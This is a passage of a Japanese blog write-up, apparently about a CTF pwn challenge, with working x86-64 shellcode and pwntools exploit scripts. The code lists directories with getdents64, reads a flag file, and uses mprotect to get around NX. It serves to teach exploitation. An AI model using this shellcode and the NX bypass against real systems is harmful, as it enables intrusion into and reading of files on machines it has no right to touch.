style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<h3 id=\"getdents-でディレクトリエントリを参照する\" style=\"position:relative;\"><a href=\"#getdents-%E3%81%A7%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E3%82%A8%E3%83%B3%E3%83%88%E3%83%AA%E3%82%92%E5%8F%82%E7%85%A7%E3%81%99%E3%82%8B\" aria-label=\"getdents でディレクトリエントリを参照する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>getdents でディレクトリエントリを参照する</h3>\n<p>前項でファイルパスを指定したファイルのデータを read して出力する Shell Code を作成しましたが、ファイル名が不明な場合にはディレクトリの探索を行う必要があります。</p>\n<p>その場合には、getdents(x64 の場合は getdents64)を使用できます。</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token function\">getdents</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> fd<span class=\"token punctuation\">,</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">linux_dirent</span> <span class=\"token operator\">*</span>dirp<span class=\"token punctuation\">,</span>\n             <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> count<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>参考：<a href=\"https://linux.die.net/man/2/getdents64\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">getdents64(2): directory entries - Linux man page</a></p>\n<p>getdents64 は以下の Shell Code で呼び出すことができます。</p>\n<p>まずは、open を使用してディレクトリのファイルディスクリプタを取得します。</p>\n<p>これは、前項の Shell Code と全く同じコードを利用できます。(ファイルパスをディレクトリパスに変更する)</p>\n<p>その後、取得したファイルディスクリプタを引数として getdents64 を発行することで、指定のバッファに結果が返されます。</p>\n<div class=\"gatsby-highlight\" data-language=\"nasm\"><pre class=\"language-nasm\"><code class=\"language-nasm\"><span class=\"token comment\">; open dir</span>\nmov <span class=\"token register variable\">rax</span>, {dir_name}\npush <span class=\"token number\">0</span>\npush <span class=\"token register variable\">rax</span>\nmov <span class=\"token register variable\">rax</span>, <span class=\"token number\">2</span> <span class=\"token comment\">; open</span>\nmov <span class=\"token register variable\">rdi</span>, <span class=\"token register variable\">rsp</span>\nmov <span class=\"token register variable\">rsi</span>, <span class=\"token number\">0</span>\nmov <span class=\"token register variable\">rdx</span>, <span class=\"token number\">0</span>\nsyscall\n\n<span class=\"token comment\">; getdents64</span>\nmov <span class=\"token register variable\">rdi</span>, <span class=\"token register variable\">rax</span>\nmov <span class=\"token register variable\">rax</span>, <span class=\"token number\">217</span> <span class=\"token comment\">; getdents64</span>\nmov <span class=\"token register variable\">rsi</span>, <span class=\"token register variable\">rsp</span>\nmov <span class=\"token register variable\">rdx</span>, <span class=\"token number\">300</span>\nsyscall</code></pre></div>\n<p>この Shell Code を利用するために以下のコードを使用します。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">dir_name <span class=\"token operator\">=</span> <span class=\"token string\">\"0x\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"/tmp/\"</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nr <span class=\"token operator\">=</span> target<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>\n<span class=\"token string-interpolation\"><span class=\"token string\">f\"\"\"mov rax, </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>dir_name<span class=\"token punctuation\">}</span></span><span class=\"token string\">\npush 0\npush rax\nmov rax, 2\nmov rdi, rsp\nmov rsi, 0\nmov rdx, 0\nsyscall\n\nmov rdi, rax\nmov rax, 217\nmov rsi, rsp\nmov rdx, 300\nsyscall\n\nmov rax, 1\nmov rdi, 1\nmov rsi, rsp\nmov rdx, 300\nsyscall\n\"\"\"</span></span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span> shellcode\ntarget<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></code></pre></div>\n<p>これを実行すると、以下のように /tmp ディレクトリ直下にあるファイルやディレクトリの名前を取得することができました。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 915px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/8b78c6b7e6d4f582ad12f45f3bc93042/4255a/image-20240627012031364.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 42.083333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABb0lEQVQoz42S23KCMBCGoyIgiKLWcBISIJzUaV+i7dTrKuD7P8jfEO3pptOLb3aT3dndP1my9h0kBVWwlCMVDXheIU5z7HiOMOaIuYC/Ywh3CRI2EIOnDEHgYzKZgBDyjaGbqMoauq5jGy3gZw5W1MZU034n/hfLnoHJrmNtBIsSuJxAX96CQ/fxnc/zaDT6u2AURzgc96ibCmnGcHxqIIpMNYl2EbZ0C8/34LpL+NIupR3UGIbxhWmamOpTdU+yPENVV2j2NU6nN/R9j7Zrpe1wPr/jfDnjeu3R9a2kUwyxtr0ohnh/7VTOy+sziBCZnEigKAXqe+GiLNA0NfaHRvm19KuqVHbIGRSJIr/7B6TyMzlniJMYxNtslKQwDOAsHDW+kmIasCxLMoNu3CTOZqaSZdsW7LmtcufzOTTtx09TtkXxyJA2oVyNQK5LIRF48CNsvBCBXBsaJVjTAHS426xBPQp35aqGjuPc3u5e8AMKEc7graZPmgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/8b78c6b7e6d4f582ad12f45f3bc93042/8ac56/image-20240627012031364.webp 240w,\n/static/8b78c6b7e6d4f582ad12f45f3bc93042/d3be9/image-20240627012031364.webp 480w,\n/static/8b78c6b7e6d4f582ad12f45f3bc93042/632b0/image-20240627012031364.webp 915w\"\n              sizes=\"(max-width: 915px) 100vw, 915px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/8b78c6b7e6d4f582ad12f45f3bc93042/8ff5a/image-20240627012031364.png 240w,\n/static/8b78c6b7e6d4f582ad12f45f3bc93042/e85cb/image-20240627012031364.png 480w,\n/static/8b78c6b7e6d4f582ad12f45f3bc93042/4255a/image-20240627012031364.png 915w\"\n            sizes=\"(max-width: 915px) 100vw, 915px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/8b78c6b7e6d4f582ad12f45f3bc93042/4255a/image-20240627012031364.png\"\n            alt=\"image-20240627012031364\"\n            title=\"image-20240627012031364\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<h3 id=\"mprotect-による-nx-の回避\" style=\"position:relative;\"><a href=\"#mprotect-%E3%81%AB%E3%82%88%E3%82%8B-nx-%E3%81%AE%E5%9B%9E%E9%81%BF\" aria-label=\"mprotect による nx の回避 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>mprotect による NX の回避</h3>\n<p>ここまでシンプルな Shell Code を作成してきましたが、特に ROP を悪用する場合は、エクスプロイトに使用する Shell Code が長くなるほど使用可能な Gadget の種類や入力バイトサイズの制限などの制約を受けやすくなります。</p>\n<p>そのような場合、ROP Chain を構築するのではなく Stack に配置した Shell Code を直接実行させることが有効な回避策になります。</p>\n<p>しかし、今回の問題バイナリのように NX が有効化されている場合、ペイロードを Stack 領域に配置してもコードを実行することができません。</p>\n<p>この問題の回避方法として、libc の mprotect を使用することで、実行権限を付与した領域に Shell Code を配置する手法があります。</p>\n<p>参考：<a href=\"https://sh0ebill.hatenablog.com/entry/2022/10/02/223537\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">SROPとNX enabledの回避 - ポン中のハシビロコウ</a></p>\n<p>例えば以下のような Shell Code を発行することで、mprotect により指定のメモリアドレスから任意のサイズ分の範囲に実行権限を割り当てることができます。</p>\n<div class=\"gatsby-highlight\" data-language=\"nasm\"><pre class=\"language-nasm\"><code class=\"language-nasm\">mov <span class=\"token register variable\">rdx</span>, <span class=\"token number\">7</span> <span class=\"token comment\">; R|W|X</span>\nmov <span class=\"token register variable\">rsi</span>, <span class=\"token number\">0x1000</span> <span class=\"token comment\">; 対象とするメモリサイズ</span>\nmov <span class=\"token register variable\">rdi</span>, {target_addr}\nmov <span class=\"token register variable\">r15</span>, {mprotect_addr}\npush <span class=\"token register variable\">r15</span>\nret</code></pre></div>\n<p>テストのために、以下のスクリプトを使用します。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># Exploit</span>\nr <span class=\"token operator\">=</span> target<span class=\"token punctuation\">.</span>recvline_startswith<span class=\"token punctuation\">(</span><span class=\"token string\">b\"System:\"</span><span class=\"token punctuation\">)</span>\nsystem_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\nr <span class=\"token operator\">=</span> target<span class=\"token punctuation\">.</span>recvline_startswith<span class=\"token punctuation\">(</span><span class=\"token string\">b\"binsh:\"</span><span class=\"token punctuation\">)</span>\nbinsh_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\nlibc_base <span class=\"token operator\">=</span> system_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x50d70</span>\nmprotect_offset <span class=\"token operator\">=</span> <span class=\"token number\">0x11eaa0</span>\nmprotect_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x11eaa0</span>\n\nr <span class=\"token operator\">=</span> target<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>\n<span class=\"token string-interpolation\"><span class=\"token string\">f\"\"\"mov rdx, 7\nmov rsi, 0x1000\nmov rdi, </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token number\">0x555555554000</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">\nmov r15, </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>mprotect_addr<span class=\"token punctuation\">}</span></span><span class=\"token string\">\npush r15\nret\n\"\"\"</span></span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span> shellcode\ntarget<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></code></pre></div>\n<p>実際にこれを実行してみると、0x555555554000 から 0x1000 バイト分の領域に書き込みと実行権限が付与されることを確認できます。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/10b870c1f7efdef14750f7f904eee3d5/58fee/image-20240627221454126.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 99.58333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsTAAALEwEAmpwYAAADN0lEQVQ4y22U2ZaiQAyGuRqVTZAdBTdcEMVdEWy1e97/mf5JqhuPzszFd1JVVP2VUEmkLJ4hHYwxS1fwgy660UjgBRE0TUWn04HrunAcR8DjGp7btv2GVFxv+Ljdcf244XwucH984vH4wna3F2LD4QjH4xH7/R6n04n2nMW8KAqxtt1usdlsBOv1GlJVlnjc77jdPsTm+/1G4xsdOsCyLCRJgjzPSXgoxuPxWNjpdPqcj0YjAe+RqqoSQmwvl4uAbz8cvgX5wGKxQL/fR6/XQxzHwuq6jkajgWaz+YZUkod1CDV8AYfAIUdRJMR5H6/xXg4zCALIskz/WYOqqk+Eh7Vg7R3PmTrkNE2F8KuHpmkKwVpIURSBVF2vOJFHZxYsKWT2mH4+e8WvNpvNMKB/w+G8HmTPOOx67elheTzhuN3huNvhTCLMgV9uuYJNHvZ7ETb0KGsKlz1dLpfiErZZlonf8uqpVK03OC2WKFc5qtVa2HO2xCnNYFNY47CLfDZHMpmIV+RH4geqX9gwjHcPD3O6lTYn0wkmdHNC6TAYj0gggUW3B2FIid77TlzymC2v14nMYb8Jen4IxvG6cJ0AvhsicAO4wRBOdwDL9aArOjRVR0vTIdO/k/W2CFOWW0+x2kpty0REAokfITE9RDqVlGbDsHtoeSFUm1LHCuFaHhTXhurY0DyXHoUe5C8xIZhOc+jmDLKxgtZJEPdHGCRzaIYPRXUIE02iRShKTYdgAeXHvuRhcSmgujs0nAq6u0C+SrGnOjbNtgiJDwlPhBc18ouY8i64o8OyvcYvq4DuZFhlc6RUapy4Si2i/IvCArV9FZxnOQJvAMOcou30EfS7lG+UgzaFrJlQ/0vnTeRNMI7WiOIcfi9HaDpod0w0ZA1NgkOSiaasoKV8I8YyW5nsv0gLb4zU6yOlRjtwfEz9GBMvwtAJYVC4bttAbHbQNSgbiJgbBlta65EN6TvT/RlLH2WBL+qBn9cKFdX0F/XC39QfD9uNSOQx9bmSa51K8nI6P7lSI+E1LlkuVWZH5SndqFvfHw88Pj9RUudhy/OCDlhUCVOqHn4kbvfcsvwfeOz5PuHB875xiT+AwBmV3zlEtwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/10b870c1f7efdef14750f7f904eee3d5/8ac56/image-20240627221454126.webp 240w,\n/static/10b870c1f7efdef14750f7f904eee3d5/d3be9/image-20240627221454126.webp 480w,\n/static/10b870c1f7efdef14750f7f904eee3d5/e46b2/image-20240627221454126.webp 960w,\n/static/10b870c1f7efdef14750f7f904eee3d5/42749/image-20240627221454126.webp 1051w\"\n              sizes=\"(max-width: 960px) 100vw, 960px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/10b870c1f7efdef14750f7f904eee3d5/8ff5a/image-20240627221454126.png 240w,\n/static/10b870c1f7efdef14750f7f904eee3d5/e85cb/image-20240627221454126.png 480w,\n/static/10b870c1f7efdef14750f7f904eee3d5/d9199/image-20240627221454126.png 960w,\n/static/10b870c1f7efdef14750f7f904eee3d5/58fee/image-20240627221454126.png 1051w\"\n            sizes=\"(max-width: 960px) 100vw, 960px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/10b870c1f7efdef14750f7f904eee3d5/d9199/image-20240627221454126.png\"\n            alt=\"image-20240627221454126\"\n            title=\"image-20240627221454126\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<h3 id=\"shellcraft-で-shell-code-を作成する\" style=\"position:relative;\"><a href=\"#shellcraft-%E3%81%A7-shell-code-%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B\" aria-label=\"shellcraft で shell code を作成する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>shellcraft で Shell Code を作成する</h3>\n<p>ここまでハンドメイドで Shell Code を作成してきましたが、pwntools の shellcraft を使用することで同様の Shell Code を生成することができます。</p>\n<p>例えば、以下のコードを使用すると、getdents64 を使用したディレクトリ探索を行う Shell Code を簡単に生成できます。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nopen_asm <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span>linux<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\ngetdents64_asm <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span>linux<span class=\"token punctuation\">.</span>getdents64<span class=\"token punctuation\">(</span><span class=\"token string\">\"rax\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rsp\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span>\nwrite_asm <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span>linux<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rsp\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'''\n</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>open_asm<span class=\"token punctuation\">}</span></span><span class=\"token string\">\n</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>getdents64_asm<span class=\"token punctuation\">}</span></span><span class=\"token string\">\n</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>write_asm<span class=\"token punctuation\">}</span></span><span class=\"token string\">\n'''</span></span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 801px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/6e6fb3bfef6eed8fd63f77ddf586301b/2ad15/image-20240628001443875.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAAByklEQVQoz4WS227aQBCG1wYVsJ1AwNjGYNbnE+aYvkZbKVV6m0jNkd6kL1GggV6kV83L/t2dRFUvKvXi0/w7Hv2zsx5mjo7hFT1E0wF4ZiNMckT5HEFSIkhL+CLyOAdPCtIujxDEGdI0RpxESNJE6ASdkw4YY2AKU5EmGRxrAN3QEOYuhlEXztCEoWuoqQrq9RrqNZWovaIoClRVFSikyewFhiD00Wq2wN4wtFwGfcSgauzvov8iTcn46NhAGAWwbRumfQKHd2n0br8NXdfR7rShaRrpZrNBtzWODDQajX+b920LfsCR5Sl8n8PzxkiSFGM+xqQqURS5aBgizVKRj4kszxCGAbio56JO1npjjzQ7/3SOh68PuLm5xvrL+g/36ztsd1s8P//C088nbDbfcPhxwH7/iMdXdt93FLfbDfaHPWl29vEMF5cXuL27JaNrYXx19ZkayPyl4P2Hd1gs55gvZpjOKmJSTXD6doXV6ZJuL+NytQCzHQv9volIjPWyBjHyIkNR5vQMUkukSTkpKS+Ro0uDalphNp+SORnKt5AJaWQK415PrMzAwWg0FD9KNLP6sATymyXOjmNT3h26Im+RljtomiZcd4DfYxoGfNk7eBoAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6e6fb3bfef6eed8fd63f77ddf586301b/8ac56/image-20240628001443875.webp 240w,\n/static/6e6fb3bfef6eed8fd63f77ddf586301b/d3be9/image-20240628001443875.webp 480w,\n/static/6e6fb3bfef6eed8fd63f77ddf586301b/99a1d/image-20240628001443875.webp 801w\"\n              sizes=\"(max-width: 801px) 100vw, 801px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6e6fb3bfef6eed8fd63f77ddf586301b/8ff5a/image-20240628001443875.png 240w,\n/static/6e6fb3bfef6eed8fd63f77ddf586301b/e85cb/image-20240628001443875.png 480w,\n/static/6e6fb3bfef6eed8fd63f77ddf586301b/2ad15/image-20240628001443875.png 801w\"\n            sizes=\"(max-width: 801px) 100vw, 801px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6e6fb3bfef6eed8fd63f77ddf586301b/2ad15/image-20240628001443875.png\"\n            alt=\"image-20240628001443875\"\n            title=\"image-20240628001443875\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>また、ファイルの内容を読み取って出力する Shell Code についても、以下のスクリプトで作成できます。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nopen_asm <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span>linux<span class=\"token punctuation\">.</span>openat<span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/flag_in_tmp.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nread_asm <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span>linux<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token string\">\"rax\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rsp\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span>\nwrite_asm <span class=\"token operator\">=</span> shellcraft<span class=\"token punctuation\">.</span>linux<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rsp\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span>\n\nshellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'''\n</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>open_asm<span class=\"token punctuation\">}</span></span><span class=\"token string\">\n</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>read_asm<span class=\"token punctuation\">}</span></span><span class=\"token string\">\n</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>write_asm<span class=\"token punctuation\">}</span></span><span class=\"token string\">\n'''</span></span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 764px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/606b74449b17023c2d3cbc2271effde7/f3c12/image-20240628001908809.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABJElEQVQoz5VQ246CMBRsoQW8IbdFQWhRFGhB3Wz2/39ttsWsycYHsw+TmdP2TOccUqsE3VeJy2eJY3dEO9wxXL+N1mjVDa2+Q14UzoZt3Vw0RNujHwaMkzbcQY8KSitEUQQiKglRS7gOR3OuIE4707BDsc+xCHww5oAzd4bv8admjMF13SccxwEhBEQ2AkVZzMVyRxBkD6acPB78F1VdYbVagToE2wNHJBiShsNlFJSadJzD8z34vg/PJLRpPM+bQSl9NexVh9v9ikH1qEWF5iShpwHZRwYpBfbFHmG4QZzECLchFosAidH23n72YjhOE47tCdN1RJ7nyLIUaZricCiRGr3ZGLM4NmcJgiB4P/JyvZ6FjW8X/btsOxLj7M+IVr8z/AE56qI9SgP2swAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/606b74449b17023c2d3cbc2271effde7/8ac56/image-20240628001908809.webp 240w,\n/static/606b74449b17023c2d3cbc2271effde7/d3be9/image-20240628001908809.webp 480w,\n/static/606b74449b17023c2d3cbc2271effde7/79237/image-20240628001908809.webp 764w\"\n              sizes=\"(max-width: 764px) 100vw, 764px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/606b74449b17023c2d3cbc2271effde7/8ff5a/image-20240628001908809.png 240w,\n/static/606b74449b17023c2d3cbc2271effde7/e85cb/image-20240628001908809.png 480w,\n/static/606b74449b17023c2d3cbc2271effde7/f3c12/image-20240628001908809.png 764w\"\n            sizes=\"(max-width: 764px) 100vw, 764px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/606b74449b17023c2d3cbc2271effde7/f3c12/image-20240628001908809.png\"\n            alt=\"image-20240628001908809\"\n            title=\"image-20240628001908809\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>いずれもハンドメイドした Shell Code と同じような動作となっており、非常に簡単にペイロードを生成することができます。</p>\n<p>この機能は非常に便利ですが、我々の目指す先はスクリプトキディではないので多用はしないようにしていこうと思います。</p>\n<h2 id=\"解法-1ファイルデータを出力して-flag-を取得する\" style=\"position:relative;\"><a href=\"#%E8%A7%A3%E6%B3%95-1%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%83%87%E3%83%BC%E3%82%BF%E3%82%92%E5%87%BA%E5%8A%9B%E3%81%97%E3%81%A6-flag-%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B\" aria-label=\"解法 1ファイルデータを出力して flag を取得する permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" 